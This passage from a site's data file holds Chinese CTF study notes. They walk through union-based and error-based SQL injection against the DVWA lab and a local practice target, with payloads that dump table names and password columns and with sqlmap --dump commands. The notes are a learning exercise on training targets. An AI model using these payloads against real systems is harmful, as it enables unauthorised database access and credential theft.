mysql_close();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n以上是DVWA的SQL注入的靶场的源代码\n\n\n# 示例的漏洞\n\n代码在构建 SQL 查询语句时，直接将用户通过 $_REQUEST['id'] 输入的值拼接到了 SQL 语句中（$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";），没有做任何的输入验证、过滤或者转义处理。\n\nSQL注入产生的条件是：Web程序要接受用户的输入，并且用户的输入不再是原本的那个参数，而是变成了SQL语句中合法的一部分。\n\n\n# 如何利用示例的漏洞\n\n1.正常查询情况下，我们输入1，此时的查询语句是\n\nSELECT first_name, last_name FROM users WHERE user_id = '1';\n\n\n1\n\n\n查询条件判断为真，返回user_id为1的用户数据；\n\n2.我们尝试SQL注入，输入1‘ and '1' = '2 ，此时最终的查询SQL语句为：\n\nSELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '2';\n\n\n1\n\n\n此时查询条件判断为假，就查不到想要的内容。\n\n3.我们把条件改一下，输入1‘ or '1234' = '1234 ，此时最终的查询SQL语句为：\n\nSELECT first_name, last_name FROM users WHERE user_id = '1' or '1234' = '1234';\n\n\n1\n\n\n查询条件判断恒为真，返回users表中所有用户数据。\n\n4.我们再修改一下条件，这次不用字符型的注入，用数字型的注入，为了方便之后查询字段数\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n/*\n以下内容为我们传入的$id，先用一个单引号把前边的单引号闭合，然后order by 1 #，这里井号是要注释下一个单引号\n*/\n1' or 1 = 1 order by 1#\n';\n\n\n1\n2\n3\n4\n5\n6\n\n\n5.同理我们修改一下参数，让order by 1的数字继续往上加\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n/*\n以下内容为我们传入的$id，先用一个单引号把前边的单引号闭合，然后order by 2 #，这里井号是要注释下一个单引号\n*/\n1' or 1 = 1 order by 2#\n';\n\n\n1\n2\n3\n4\n5\n6\n\n\n当加到3的时候，也就是超过列的数量的时候，会报类似以下错误：\n\nUnknown column '3' in 'order clause'\n\n\n1\n\n\n这样就说明这张表只有两列\n\n6.确认显示的字段的顺序，输入1' union select 1,2 # ，查询成功(用到了联合查询)\n\nSELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,2 #';\n\n\n1\n\n\n在使用union时，我们需要注意左右两端的字段数需要相同，如果我们两边字段数不同，会报以下错误\n\nselect * from users union select 1;\nERROR 1222(21000): The used SELECT statements have a different number of columns\n\n\n1\n2\n\n\n7.以上已经完成了所有的前期准备，接下来我们正式获取数据库信息了\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n1' union select 1,database() #';\n\n\n1\n2\n\n\n\n\n注：图仅供参考，可能有错漏\n\n以上查询就可以找到数据库名\n\n8.获取当前数据库的表名\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #';\n\n\n1\n2\n3\n\n\n\n\n注：图仅供参考，可能有错漏\n\n> 需要了解：\n> \n> group_concat()，意思是把所有查出来的东西放到一起，一列的所有行结果都放到一起。这里最好是用上这个group_concat，有的时候题目环境会限制输出，比如我们查到了100行内容，但是只输出一行，这时候就用到了这个group_concat\n> \n> information_schema.tables，在MySQL中，information_schema看作是一个信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名称、数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表，他们实际上是视图，而不是基本表。因此无法看到与之相关的任何文件。\n> \n>  1. SCHEMATA表：提供了当前mysql实例中所有数据库的信息，是show databases的结果取之于此表\n>  2. TABLES表：提供了关于数据库中表的信息（包括视图），详细标书了某个表属于哪个schema，表类型，表引擎，创建时间等。是show tables from schemaname的结果就取之于此表\n>  3. COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息，是show columns from schemaname.tablename的结果取之于此表。\n\n9.获取表中的字段名\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #';\n\n\n1\n2\n3\n\n\n\n\n注：图仅供参考，可能有错漏\n\n10.此外，还要考虑如果题目环境如果做了限制，查询到了100条，只显示一条这种情况\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' and 1=2\nunion select 1,group_concat(column_name) from information_schema.columns where table_name='users' #';\n\n\n1\n2\n3\n4\n\n\n只要让union左边的表没有东西，就会直接显示右边的表的第一行内容\n\n\n\n注：图仅供参考，可能有错漏\n\n11.如果不让用group_concat函数怎么办？我们可以用limit 0 ,1(从第0行开始，输出1条内容)\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' and 1=2\nunion select 1,group_concat(column_name) from information_schema.columns where table_name='users'\nlimit 0,1\n#';\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n\n注：图仅供参考，可能有错漏\n\n12.获取数据\n\nSELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' or 1=1\nunion select group_concat(user_id,first_name,last_name),group_concat(password) from users\n#';\n\n\n1\n2\n3\n4\n5\n\n\n\n# 总结\n\n联合查询常用套路和步骤：\n\n 1. order by 猜列数\n 2. union select 跟列数找到回显点，对应的地方放查询语句\n\n例：得知有3列，可以union select 233,666,777找到页面中回显的地方，比如233被回显到了页面中，泽可以union select database(),666,777即可得到数据库名。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第26天\n\n\n\n * 示例\n * 示例的漏洞\n * 如何利用示例的漏洞\n * 总结\n\n\n\n * 视频地址【传送门】\n\n\n# 第8章：联合查询注入的作用\n\n\n# 示例\n\n看一段有漏洞的代码\n\n<?php\nif (isset($_request['submit'])) {\n    // get input 从用户请求中获取id参数\n    $id = $_request['id'];\n\n    // check database 然后直接将id参数的值拼接进sql语句，进行sql查询\n    $query = \"select first_name, last_name from users where user_id = '$id';\";\n    $result = mysql_query($query) or die('<pre>'. mysql_error(). '</pre>');\n\n    // get results\n    $num = mysql_numrows($result);\n    $i = 0;\n    while ($i < $num) {\n        //get values\n        $first = mysql_result($result, $i, \"first_name\");\n        $last = mysql_result($result, $i, \"last_name\");\n\n        //feedback for end user 最终输出查询结果\n        echo \"<pre>id: {$id}<br />firest name: {$first}<br />surname: {$last}</pre>\";\n\n        //increase loop count\n        $i++;\n    }\n    mysql_close();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n以上是dvwa的sql注入的靶场的源代码\n\n\n# 示例的漏洞\n\n代码在构建 sql 查询语句时，直接将用户通过 $_request['id'] 输入的值拼接到了 sql 语句中（$query = \"select first_name, last_name from users where user_id = '$id';\";），没有做任何的输入验证、过滤或者转义处理。\n\nsql注入产生的条件是：web程序要接受用户的输入，并且用户的输入不再是原本的那个参数，而是变成了sql语句中合法的一部分。\n\n\n# 如何利用示例的漏洞\n\n1.正常查询情况下，我们输入1，此时的查询语句是\n\nselect first_name, last_name from users where user_id = '1';\n\n\n1\n\n\n查询条件判断为真，返回user_id为1的用户数据；\n\n2.我们尝试sql注入，输入1‘ and '1' = '2 ，此时最终的查询sql语句为：\n\nselect first_name, last_name from users where user_id = '1' and '1' = '2';\n\n\n1\n\n\n此时查询条件判断为假，就查不到想要的内容。\n\n3.我们把条件改一下，输入1‘ or '1234' = '1234 ，此时最终的查询sql语句为：\n\nselect first_name, last_name from users where user_id = '1' or '1234' = '1234';\n\n\n1\n\n\n查询条件判断恒为真，返回users表中所有用户数据。\n\n4.我们再修改一下条件，这次不用字符型的注入，用数字型的注入，为了方便之后查询字段数\n\nselect first_name, last_name from users where user_id = '\n/*\n以下内容为我们传入的$id，先用一个单引号把前边的单引号闭合，然后order by 1 #，这里井号是要注释下一个单引号\n*/\n1' or 1 = 1 order by 1#\n';\n\n\n1\n2\n3\n4\n5\n6\n\n\n5.同理我们修改一下参数，让order by 1的数字继续往上加\n\nselect first_name, last_name from users where user_id = '\n/*\n以下内容为我们传入的$id，先用一个单引号把前边的单引号闭合，然后order by 2 #，这里井号是要注释下一个单引号\n*/\n1' or 1 = 1 order by 2#\n';\n\n\n1\n2\n3\n4\n5\n6\n\n\n当加到3的时候，也就是超过列的数量的时候，会报类似以下错误：\n\nunknown column '3' in 'order clause'\n\n\n1\n\n\n这样就说明这张表只有两列\n\n6.确认显示的字段的顺序，输入1' union select 1,2 # ，查询成功(用到了联合查询)\n\nselect first_name, last_name from users where user_id = '1' union select 1,2 #';\n\n\n1\n\n\n在使用union时，我们需要注意左右两端的字段数需要相同，如果我们两边字段数不同，会报以下错误\n\nselect * from users union select 1;\nerror 1222(21000): the used select statements have a different number of columns\n\n\n1\n2\n\n\n7.以上已经完成了所有的前期准备，接下来我们正式获取数据库信息了\n\nselect first_name, last_name from users where user_id = '\n1' union select 1,database() #';\n\n\n1\n2\n\n\n\n\n注：图仅供参考，可能有错漏\n\n以上查询就可以找到数据库名\n\n8.获取当前数据库的表名\n\nselect first_name, last_name from users where user_id = '\n# 以下是输入的内容\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #';\n\n\n1\n2\n3\n\n\n\n\n注：图仅供参考，可能有错漏\n\n> 需要了解：\n> \n> group_concat()，意思是把所有查出来的东西放到一起，一列的所有行结果都放到一起。这里最好是用上这个group_concat，有的时候题目环境会限制输出，比如我们查到了100行内容，但是只输出一行，这时候就用到了这个group_concat\n> \n> information_schema.tables，在mysql中，information_schema看作是一个信息数据库，其中保存着关于mysql服务器所维护的所有其他数据库的信息，如数据库名称、数据库的表，表栏的数据类型与访问权限等。在information_schema中，有数个只读表，他们实际上是视图，而不是基本表。因此无法看到与之相关的任何文件。\n> \n>  1. schemata表：提供了当前mysql实例中所有数据库的信息，是show databases的结果取之于此表\n>  2. tables表：提供了关于数据库中表的信息（包括视图），详细标书了某个表属于哪个schema，表类型，表引擎，创建时间等。是show tables from schemaname的结果就取之于此表\n>  3. columns表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息，是show columns from schemaname.tablename的结果取之于此表。\n\n9.获取表中的字段名\n\nselect first_name, last_name from users where user_id = '\n# 以下是输入的内容\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #';\n\n\n1\n2\n3\n\n\n\n\n注：图仅供参考，可能有错漏\n\n10.此外，还要考虑如果题目环境如果做了限制，查询到了100条，只显示一条这种情况\n\nselect first_name, last_name from users where user_id = '\n# 以下是输入的内容\n1' and 1=2\nunion select 1,group_concat(column_name) from information_schema.columns where table_name='users' #';\n\n\n1\n2\n3\n4\n\n\n只要让union左边的表没有东西，就会直接显示右边的表的第一行内容\n\n\n\n注：图仅供参考，可能有错漏\n\n11.如果不让用group_concat函数怎么办？我们可以用limit 0 ,1(从第0行开始，输出1条内容)\n\nselect first_name, last_name from users where user_id = '\n# 以下是输入的内容\n1' and 1=2\nunion select 1,group_concat(column_name) from information_schema.columns where table_name='users'\nlimit 0,1\n#';\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n\n注：图仅供参考，可能有错漏\n\n12.获取数据\n\nselect first_name, last_name from users where user_id = '\n# 以下是输入的内容\n1' or 1=1\nunion select group_concat(user_id,first_name,last_name),group_concat(password) from users\n#';\n\n\n1\n2\n3\n4\n5\n\n\n\n# 总结\n\n联合查询常用套路和步骤：\n\n 1. order by 猜列数\n 2. union select 跟列数找到回显点，对应的地方放查询语句\n\n例：得知有3列，可以union select 233,666,777找到页面中回显的地方，比如233被回显到了页面中，泽可以union select database(),666,777即可得到数据库名。",charsets:{cjk:!0},lastUpdated:"2024/12/13, 23:38:47",lastUpdatedTimestamp:1734104327e3},{title:"20241212CTF学习笔记9",frontmatter:{title:"20241212CTF学习笔记9",date:"2024-12-12T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-12-CTFLearn.html",relativePath:"views/numerology/2024-12-12-CTFLearn.md",key:"v-356d6c7c",path:"/views/numerology/2024-12-12-CTFLearn.html",headers:[{level:2,title:"数据库基础知识",slug:"数据库基础知识",normalizedTitle:"数据库基础知识",charIndex:43},{level:2,title:"什么是SQL注入",slug:"什么是sql注入",normalizedTitle:"什么是sql注入",charIndex:54},{level:3,title:"定义：",slug:"定义",normalizedTitle:"定义：",charIndex:68},{level:3,title:"通俗解释：",slug:"通俗解释",normalizedTitle:"通俗解释：",charIndex:77},{level:3,title:"类型：",slug:"类型",normalizedTitle:"类型：",charIndex:88},{level:2,title:"报错注入基础",slug:"报错注入基础",normalizedTitle:"报错注入基础",charIndex:95},{level:3,title:"定义：",slug:"定义-2",normalizedTitle:"定义：",charIndex:68},{level:3,title:"使用场景：",slug:"使用场景",normalizedTitle:"使用场景：",charIndex:116},{level:3,title:"XML和Xpath基础",slug:"xml和xpath基础",normalizedTitle:"xml和xpath基础",charIndex:127},{level:3,title:"📍 updatexml()",slug:"📍-updatexml",normalizedTitle:"📍 updatexml()",charIndex:144},{level:3,title:"📍 extractvalue()",slug:"📍-extractvalue",normalizedTitle:"📍 extractvalue()",charIndex:164},{level:3,title:"❓题目练习",slug:"❓题目练习",normalizedTitle:"❓题目练习",charIndex:187},{level:3,title:"使用extractvalue()函数完成例题",slug:"使用extractvalue-函数完成例题",normalizedTitle:"使用extractvalue()函数完成例题",charIndex:198},{level:3,title:"使用sqlMap完成例题",slug:"使用sqlmap完成例题",normalizedTitle:"使用sqlmap完成例题",charIndex:226}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第27天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"数据库基础知识 什么是SQL注入 定义： 通俗解释： 类型： 报错注入基础 定义： 使用场景： XML和Xpath基础 📍 updatexml() 📍 extractvalue() ❓题目练习 使用extractvalue()函数完成例题 使用sqlMap完成例题",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第27天\n\n\n\n * 数据库基础知识\n * 什么是SQL注入\n   * 定义：\n   * 通俗解释：\n   * 类型：\n * 报错注入基础\n   * 定义：\n   * 使用场景：\n   * XML和Xpath基础\n   * 📍 updatexml()\n   * 📍 extractvalue()\n   * ❓题目练习\n   * 使用extractvalue()函数完成例题\n   * 使用sqlMap完成例题\n\n\n\n * 视频地址【传送门】\n\n\n# 第9章：MySQL基础\n\n\n# 数据库基础知识\n\nRDBMS是关系型数据库管理系统的简称\n\n库->表->列->行\n\nSQL是用于访问和处理数据库的标准语言。SQL的范围包括数据插入、查询、更新和删除\n\n 1.  显示数据库 show databases;\n 2.  打开数据库 use db_name;\n 3.  显示数据表 show tables;\n 4.  显示表结构 describe table_name;\n 5.  显示表中各字段信息 show colums from table_name;\n 6.  显示表创建过程 show create table 表名\n 7.  列出当前mysql 的状态信息 status\n 8.  删除数据库 drop database 库名\n 9.  清空数据表 delete from table_name; truncate table from table_name;\n 10. 删除数据表 drop table table_name\n 11. 数据库连接 mysql -uroot -p\n 12. 数据库退出 exit\n\n\n# 什么是SQL注入\n\n\n# 定义：\n\nSQL注入是一种将SQL代码插入或添加到应用的输入的参数中的攻击，之后再将这些参数传递给后台的SQL服务加以解析并执行。\n\n凡是构造SQL语句的步骤均存在被潜在攻击的风险。SQL注入的主要方式是直接将代码插入参数中，这些参数会被置入SQL命令中加以执行。\n\n攻击者把SQL命令语句作为输入被服务器SQL解释器正确执行解析，数据库把查询到的结果返回给服务器，然后呈现给攻击者，攻击者由此获得数据库内的数据信息\n\n\n# 通俗解释：\n\n用户控制了SQL语句的一部分，用户的输入不再是一个输入参数，而成为了符合语法的SQL语句\n\n\n# 类型：\n\n 1. 按回显方式划分\n\n有回显    \n联合查询   构造联合查询语句，直接查看查询结果\n报错注入   构造报错语句，在报错中查看结果\n堆查询    多行语句执行，进而实现想要达到的目的\n\n无回显   \n盲注    布尔型/时间型，通过某种手段“爆破”结果\n\n\n# 第10章：报错注入\n\n\n# 报错注入基础\n\n\n# 定义：\n\n报错注入就是利用了数据库的某些机制，人为制造错误条件，使得查询结果能出现在错误信息里\n\n\n# 使用场景：\n\n报错注入在用union联合查询不太好用，不能直接得出结果时用，但前提时不能过滤一些关键的函数\n\n报错注入和联合注入都属于特别入门级的题目\n\n\n# XML和Xpath基础\n\n什么是XML？XML指可拓展标记语言，类似于HTML，设计宗旨是传输数据，而非定义标签。XML被设计为具有自我描述性，是W3C的推荐标准。Xpath是对xml进行寻址。\n\n\n# 📍 updatexml()\n\n📝**定义：**updatexml是由于参数的格式不正确而产生的错误❌，同样会返回参数信息。\n\n📝**适用版本：**MySQL5.1.5+\n\n📝函数语法：\n\nupdatexml(XML_DOCUMENT, XPath_string, new value);\n我们通常在第二个Xpath_string参数填写我们要查询的内容。\n\n\n1\n2\n\n\n📝**payload：**updatexml(1,concat(0x7e,(select user()),0x7e),1)\n\n📝**漏洞利用原理：**目标查询语句的前后添加 ~ 使其符合xpath格式报错，报错信息里有我们想要的内容\n\n📝**解释：**updatexml(1,concat(波浪线,(select user()),波浪线),1)，我们只是想要select user()的结果\n\n\n\n通过以上示例，我们看到报了error的错，错误信息是[HY000][1105] XPATH syntax error: '~root@localhost~'。\n\n同理我们可以将目标查询替换为select database()或者select group_concat(name) from users等。\n\n\n# 📍 extractvalue()\n\n📝**适用版本：**MySQL5.1.5+\n\n📝**函数语法：**EXTRACTVALUE(XML_DOCUMENT, Xpath_string);\n\n📝**漏洞利用原理：**和updatexml函数相同，查询前后添加波浪线让其报错\n\n📝**payload：**extractvalue(1,concat(0x7e,(select user()),0x7e))\n\n📝**函数语法：**extractvalue(1,concat(0x7e,(select user()),0x7e))\n\n📝**解释：**对比updatexml函数，只是不需要第三个参数，0x7e是波浪线，用它确保波浪线绝对不是xpath语法\n\n\n# ❓题目练习\n\n进入靶场，我们看到一个学生信息管理系统，可以用HackBar传入一个带单引号的参数试一下\n\n\n\n直接返回了数据库的报错信息❌❌❌（现实环境中怎么可能会输出数据库的报错信息）\n\nYou have an eror in your SqL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \"2019122001\" at line 1 \n\n\n1\n\n\n我们尝试重新输入请求，发现可以正常查询出结果，和刚才图片中的结果相同\n\nhttp://127.0.0.1:8000/?student_id=2019122001' or '1' = '1\n\n\n1\n\n\n同理，我们也可以不用字符型的，用数字型的where条件，但是要注意要把#进行URL编码得到%23\n\nhttp://127.0.0.1:8000/?student_id=2019122001' or 1 = 1%23\n\n\n1\n\n\n> 在进行URL编码时，感觉线上工具的限制太大了，未来可能会在内网比赛，需要一个离线的工具，翻看了hello-ctf的工具列表，找到了一个合适的工具：\n> \n> 项目名称        USAGE          项目地址         文档\n> CyberChef   近乎全能的编码解码工具。   官网 国内中文镜像站   /\n\n之后我们尝试order by来找到这张表有几个字段，用1、2、3以此类推，当order by 4的时候报错了，所以有3列\n\nhttp://127.0.0.1:8000/?student_id=2019122001' order by 1、2、3\n\n\n1\n\n\n下一步我们进行union的联合查询，理想结果是1，2，3都展示在列表里\n\nhttp://127.0.0.1:8000/?student_id=2019122001' union select 1,2,3%23\n\n\n1\n\n\n上边的请求结果发现还是2019122001、Tom、information Security。此时我们修改一下请求\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select 1,2,3%23\n\n\n1\n\n\n这次回显了1，2，3。这意味着三列都可以回显，接下来的步骤是查表、查字段、查数据等\n\n因为我们知道了原理，下边我们直接用工具HackBar注入\n\n\n\n图中是查表，其实可以先从查库名开始，点击以后出现以下页面，需要输入参数\n\n\n\nThe number of columns这个参数需要填我们有几个列，刚才用order by找到是有3个字段，3列\n\nOutput position这个参数是刚刚看的123第几个被回显了，而我们是3个都回显了，所以123任意一个都可以\n\n\n\n以上就是所有的数据库，同理我们可以用select database()来查当前数据库\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select database(),2,3%23\n\n\n1\n\n\n同理，接下来我们查表名，用SQLI -> MySQL -> Dump tables from database\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(table_name),2,3 from information_schema tables where table_schema=database()%23\n\n\n1\n\n\n查到的结果是student,teacher、2、3\n\n同理我们查列，用SQLI -> MySQL -> Dump columns from database\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database()%23\n\n\n1\n\n\n查到的结果是id,name,majority,id,name,card_passwd,age，这是这两张表所有的列，此时我们不知道哪个列对应哪个表，我们再加一个条件\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database() and table_name='teacher'%23\n\n\n1\n\n\n有了表和列，我们可以查数据了\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(id),group_concat(name,age),group_concat(card_passwd) from teacher%23\n\n\n1\n\n\n结果是\n\n学号                  姓名                              专业\n78820,91723,88915   Terry43,Fry34,Steve36,Tomia45   829012,114514,234231,flag{SQL_Inj3ct10n}\n\n\n# 使用extractvalue()函数完成例题\n\n我们用extractvalue函数拼接出以下请求\n\nhttp://127.0.0.1:8000/?student_id=1%27 and extractvalue(1,concat(0x0a,(select group_concat(card_passwd)from teacher)))%23\n\n\n1\n\n\n得到了如下报错信息，发现报错信息太长了，部分内容不显示了\n\nXPATH syntax error:'829012,114514,234231,fag{SQL_1'\n\n\n1\n\n\n我们优化一下请求，从后20位开始截取\n\nhttp://127.0.0.1:8000/?student_id=1%27 and extractvalue(1,concat(0x0a,(select substr((select group_concat(card_passwd)from teacher),20))))%23\n\n\n1\n\n\n得到了如下报错信息，由此我们可以学到，如果长度不够，可以尝试截取，\n\nr:'234231,flag{SQL_Inj3ct10n}\n\n\n1\n\n\n\n# 使用sqlMap完成例题\n\n# 跑数据库\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --dbs\n# 现在使用的数据库\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --current-db\n# -D是指定库名 -tables是查所有表\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --D college -tables\n# -T 是指定表名 --columns是所有列\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --D college -T teacher --columns\n# --dump是将表中所有信息dump出来\nsqlmap -u http://127.0.0.1:8000/\\?student id\\=2019122001 --D college -T teacher --dump\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第27天\n\n\n\n * 数据库基础知识\n * 什么是sql注入\n   * 定义：\n   * 通俗解释：\n   * 类型：\n * 报错注入基础\n   * 定义：\n   * 使用场景：\n   * xml和xpath基础\n   * 📍 updatexml()\n   * 📍 extractvalue()\n   * ❓题目练习\n   * 使用extractvalue()函数完成例题\n   * 使用sqlmap完成例题\n\n\n\n * 视频地址【传送门】\n\n\n# 第9章：mysql基础\n\n\n# 数据库基础知识\n\nrdbms是关系型数据库管理系统的简称\n\n库->表->列->行\n\nsql是用于访问和处理数据库的标准语言。sql的范围包括数据插入、查询、更新和删除\n\n 1.  显示数据库 show databases;\n 2.  打开数据库 use db_name;\n 3.  显示数据表 show tables;\n 4.  显示表结构 describe table_name;\n 5.  显示表中各字段信息 show colums from table_name;\n 6.  显示表创建过程 show create table 表名\n 7.  列出当前mysql 的状态信息 status\n 8.  删除数据库 drop database 库名\n 9.  清空数据表 delete from table_name; truncate table from table_name;\n 10. 删除数据表 drop table table_name\n 11. 数据库连接 mysql -uroot -p\n 12. 数据库退出 exit\n\n\n# 什么是sql注入\n\n\n# 定义：\n\nsql注入是一种将sql代码插入或添加到应用的输入的参数中的攻击，之后再将这些参数传递给后台的sql服务加以解析并执行。\n\n凡是构造sql语句的步骤均存在被潜在攻击的风险。sql注入的主要方式是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。\n\n攻击者把sql命令语句作为输入被服务器sql解释器正确执行解析，数据库把查询到的结果返回给服务器，然后呈现给攻击者，攻击者由此获得数据库内的数据信息\n\n\n# 通俗解释：\n\n用户控制了sql语句的一部分，用户的输入不再是一个输入参数，而成为了符合语法的sql语句\n\n\n# 类型：\n\n 1. 按回显方式划分\n\n有回显    \n联合查询   构造联合查询语句，直接查看查询结果\n报错注入   构造报错语句，在报错中查看结果\n堆查询    多行语句执行，进而实现想要达到的目的\n\n无回显   \n盲注    布尔型/时间型，通过某种手段“爆破”结果\n\n\n# 第10章：报错注入\n\n\n# 报错注入基础\n\n\n# 定义：\n\n报错注入就是利用了数据库的某些机制，人为制造错误条件，使得查询结果能出现在错误信息里\n\n\n# 使用场景：\n\n报错注入在用union联合查询不太好用，不能直接得出结果时用，但前提时不能过滤一些关键的函数\n\n报错注入和联合注入都属于特别入门级的题目\n\n\n# xml和xpath基础\n\n什么是xml？xml指可拓展标记语言，类似于html，设计宗旨是传输数据，而非定义标签。xml被设计为具有自我描述性，是w3c的推荐标准。xpath是对xml进行寻址。\n\n\n# 📍 updatexml()\n\n📝**定义：**updatexml是由于参数的格式不正确而产生的错误❌，同样会返回参数信息。\n\n📝**适用版本：**mysql5.1.5+\n\n📝函数语法：\n\nupdatexml(xml_document, xpath_string, new value);\n我们通常在第二个xpath_string参数填写我们要查询的内容。\n\n\n1\n2\n\n\n📝**payload：**updatexml(1,concat(0x7e,(select user()),0x7e),1)\n\n📝**漏洞利用原理：**目标查询语句的前后添加 ~ 使其符合xpath格式报错，报错信息里有我们想要的内容\n\n📝**解释：**updatexml(1,concat(波浪线,(select user()),波浪线),1)，我们只是想要select user()的结果\n\n\n\n通过以上示例，我们看到报了error的错，错误信息是[hy000][1105] xpath syntax error: '~root@localhost~'。\n\n同理我们可以将目标查询替换为select database()或者select group_concat(name) from users等。\n\n\n# 📍 extractvalue()\n\n📝**适用版本：**mysql5.1.5+\n\n📝**函数语法：**extractvalue(xml_document, xpath_string);\n\n📝**漏洞利用原理：**和updatexml函数相同，查询前后添加波浪线让其报错\n\n📝**payload：**extractvalue(1,concat(0x7e,(select user()),0x7e))\n\n📝**函数语法：**extractvalue(1,concat(0x7e,(select user()),0x7e))\n\n📝**解释：**对比updatexml函数，只是不需要第三个参数，0x7e是波浪线，用它确保波浪线绝对不是xpath语法\n\n\n# ❓题目练习\n\n进入靶场，我们看到一个学生信息管理系统，可以用hackbar传入一个带单引号的参数试一下\n\n\n\n直接返回了数据库的报错信息❌❌❌（现实环境中怎么可能会输出数据库的报错信息）\n\nyou have an eror in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near \"2019122001\" at line 1 \n\n\n1\n\n\n我们尝试重新输入请求，发现可以正常查询出结果，和刚才图片中的结果相同\n\nhttp://127.0.0.1:8000/?student_id=2019122001' or '1' = '1\n\n\n1\n\n\n同理，我们也可以不用字符型的，用数字型的where条件，但是要注意要把#进行url编码得到%23\n\nhttp://127.0.0.1:8000/?student_id=2019122001' or 1 = 1%23\n\n\n1\n\n\n> 在进行url编码时，感觉线上工具的限制太大了，未来可能会在内网比赛，需要一个离线的工具，翻看了hello-ctf的工具列表，找到了一个合适的工具：\n> \n> 项目名称        usage          项目地址         文档\n> cyberchef   近乎全能的编码解码工具。   官网 国内中文镜像站   /\n\n之后我们尝试order by来找到这张表有几个字段，用1、2、3以此类推，当order by 4的时候报错了，所以有3列\n\nhttp://127.0.0.1:8000/?student_id=2019122001' order by 1、2、3\n\n\n1\n\n\n下一步我们进行union的联合查询，理想结果是1，2，3都展示在列表里\n\nhttp://127.0.0.1:8000/?student_id=2019122001' union select 1,2,3%23\n\n\n1\n\n\n上边的请求结果发现还是2019122001、tom、information security。此时我们修改一下请求\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select 1,2,3%23\n\n\n1\n\n\n这次回显了1，2，3。这意味着三列都可以回显，接下来的步骤是查表、查字段、查数据等\n\n因为我们知道了原理，下边我们直接用工具hackbar注入\n\n\n\n图中是查表，其实可以先从查库名开始，点击以后出现以下页面，需要输入参数\n\n\n\nthe number of columns这个参数需要填我们有几个列，刚才用order by找到是有3个字段，3列\n\noutput position这个参数是刚刚看的123第几个被回显了，而我们是3个都回显了，所以123任意一个都可以\n\n\n\n以上就是所有的数据库，同理我们可以用select database()来查当前数据库\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select database(),2,3%23\n\n\n1\n\n\n同理，接下来我们查表名，用sqli -> mysql -> dump tables from database\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(table_name),2,3 from information_schema tables where table_schema=database()%23\n\n\n1\n\n\n查到的结果是student,teacher、2、3\n\n同理我们查列，用sqli -> mysql -> dump columns from database\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database()%23\n\n\n1\n\n\n查到的结果是id,name,majority,id,name,card_passwd,age，这是这两张表所有的列，此时我们不知道哪个列对应哪个表，我们再加一个条件\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database() and table_name='teacher'%23\n\n\n1\n\n\n有了表和列，我们可以查数据了\n\nhttp://127.0.0.1:8000/?student_id=2019122001' and 1=2 union select group_concat(id),group_concat(name,age),group_concat(card_passwd) from teacher%23\n\n\n1\n\n\n结果是\n\n学号                  姓名                              专业\n78820,91723,88915   terry43,fry34,steve36,tomia45   